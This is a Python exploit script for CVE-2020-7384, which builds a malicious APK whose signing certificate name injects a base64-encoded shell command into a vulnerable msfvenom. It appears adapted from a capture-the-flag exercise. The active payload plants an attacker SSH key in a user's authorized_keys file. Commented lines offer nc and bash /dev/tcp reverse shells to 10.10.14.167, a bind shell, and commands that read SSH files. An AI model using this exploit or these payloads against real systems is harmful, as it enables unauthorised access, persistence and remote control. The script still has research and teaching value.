# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
# Exploit Author: Justin Steven
# Vendor Homepage: https://www.metasploit.com/
# Software Link: https://www.metasploit.com/
# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
# CVE : CVE-2020-7384

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# POC
#payload = 'echo "nc: $(which nc), python: $(which python)" > $PWD/static/win'
# discovery
#payload = 'echo "$(ls -alh /home/kid/.ssh)" > $PWD/static/win'
#payload = 'echo "$(cat /home/kid/.ssh/authorized_keys)" > $PWD/static/win'
payload = 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWBx7IYLiLMolXqyV74/5W5XOcW0no0V4ZzHQTZdmyfoca2RHLAY1HWuWthAQHkGlGrdFuRirYo/tgk6PtfS+C5nmpWL+26Zv8CEQSMxXBOFr6h8BKFBFvejQKEQYRrsLaVeG/GHY6fs2dcQ4XAN40d/y274axPmYwx5LJGQ/1f2XU5u4YZzEZEd9LbYhPSDOMmY/VfnUDmAMMnbAGIFBsEfFttwLpER+7OokliV+/k8BhUONB87CWC1bv3fGUjkz06APiL//e9NFc43P18O0fpMUnOsy9WiFtdbsc6vIcW5V5lGaTyPCrIBE1Se5zvb41rG74sMfGiNMnP4eyNICqaklqHw4LhOq4g+GVWsC52cYuucVmw49AmtStZgUeWqhS05GO4wJcF81z1hjveDbKJePmTsUcVh/Qf70bocTJ0/Q/RxKFyVK9ffmH68NPj0VJpJD5ukmGngbZWuLAeOod609MPKKQIJsl/roSq6DBmQLEf2ntcusOxMll8dSBMj8= kali@kali" >> /home/kid/.ssh/authorized_keys'

# nc reverse shell
# payload = 'nc 10.10.14.167 5151 -e /bin/sh'
# ping
# payload = 'ping 10.10.14.167 -c 1'
# payload = 'nc -lvp 5151 -e /bin/sh'
# bash reverse  shell
# payload = 'bash -i >& /dev/tcp/10.10.14.167/5151 0>&1'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                           "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                           "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
